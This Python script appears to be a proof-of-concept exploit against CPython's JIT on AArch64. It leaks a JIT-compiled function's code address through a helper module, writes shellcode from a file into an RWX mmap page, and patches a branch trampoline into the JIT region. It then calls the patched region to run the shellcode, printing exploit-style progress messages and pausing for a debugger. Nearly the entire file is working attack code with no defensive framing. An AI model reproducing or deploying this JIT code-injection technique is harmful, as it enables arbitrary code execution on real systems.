import ctypes
import struct
import jitexecleak

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20
PAGE_SIZE = 0x1000

libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p

# Step 1: Trigger JIT
def hot_loop(x):
    acc = 0
    for _ in range(100_000):
        acc ^= x + 3
    return acc

print("[*] Triggering JIT...")
for _ in range(1000):
    hot_loop(42)

jit_addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] executor->jit_code: 0x{jit_addr:x}")

# Step 2: Allocate RWX mmap for shellcode
mmap_addr = libc.mmap(None, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
if mmap_addr in (0, -1):
    raise RuntimeError("[-] mmap failed")

print(f"[+] RWX shellcode region: 0x{mmap_addr:x}")

# Step 3: Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

ctypes.memmove(mmap_addr, shellcode, len(shellcode))
print("[*] Shellcode written to mmap")

# Step 4: Build trampoline in JIT
# trampoline: ldr x16, #8; br x16; .quad shellcode address
trampoline = (
    b"\x50\x00\x00\x58" +                 # ldr x16, #8 (PC-relative)
    b"\x00\x02\x1f\xd6" +                 # br x16
    struct.pack("<Q", mmap_addr)         # jump target
)

# Step 5: Inject trampoline into JIT
ctypes.memmove(jit_addr, trampoline, len(trampoline))
print("[*] Trampoline injected into JIT region")

# Optional GDB pause
input("[*] Attach GDB now, then press ENTER to execute...")

# Step 6: Execute trampoline via JIT
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(jit_addr)
print("[*] Jumping to trampoline in JIT...")
fn()
